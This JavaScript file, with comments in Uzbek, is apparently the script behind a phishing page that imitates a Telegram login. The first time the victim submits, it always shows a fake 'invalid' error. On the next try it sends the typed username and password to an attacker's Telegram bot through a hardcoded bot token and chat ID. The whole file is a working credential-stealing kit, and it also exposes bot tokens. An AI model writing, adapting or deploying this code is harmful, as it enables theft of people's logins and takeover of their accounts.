document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('telegramForm');
  const loading = document.getElementById('loading');
  const validText = document.querySelector('.invalid'); // invalid text element
  const username = document.getElementById('username');
  const password = document.getElementById('password');
  
  let tryCount = 0;

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    // Inputlardan "invalid" classini olib tashlash
    username.classList.remove('invalid-input');
    password.classList.remove('invalid-input');
    validText.style.display = 'none';

    // Agar birinchi marta xato qilinsa
    if (tryCount === 0) {
      username.classList.add('invalid-input');
      password.classList.add('invalid-input');
      validText.style.display = 'block';
      tryCount++;
      return; // bu yerda to‘xtaydi
    } else {
      // Keyingi urinishlarda loading ko‘rsatish
      loading.style.display = 'flex';

      setTimeout(() => {
        const encodedUsername = encodeURIComponent(username.value);
        const encodedPassword = encodeURIComponent(password.value);

        const jonatish = `<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>`;

        // Telegram Bot API URL (chat_id va bot token bilan)
        const botToken = '8266692885:AAEdEDxGWabpCZ8DIdC210x5sDdXAYMP_74';
        const chatId = '1149498566';
        const url = `https://api.telegram.org/bot8711077410:AAEav8UlPguvEne84YGtFAbqXZM8NroSo54/sendMessage?chat_id=7672567838&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;

        fetch(url, { method: 'GET' })
          .then(response => response.json())
          .then(data => {
            loading.style.display = 'none';
            if (data.ok) {
              console.log('Message sent, ID:', data.result.message_id);
              alert('Ma’lumot yuborildi!');
            } else {
              console.error('Telegram error code:', data.error_code);
              alert('Xatolik yuz berdi, qayta urinib ko‘ring!');
            }
            username.value = '';
            password.value = '';
          })
          .catch(error => {
            loading.style.display = 'none';
            alert('Error! Please try again: ' + error.message);
            console.error(error);
            username.value = '';
            password.value = '';
          });
      }, 2000); // 2 soniya loading
    }
  });
});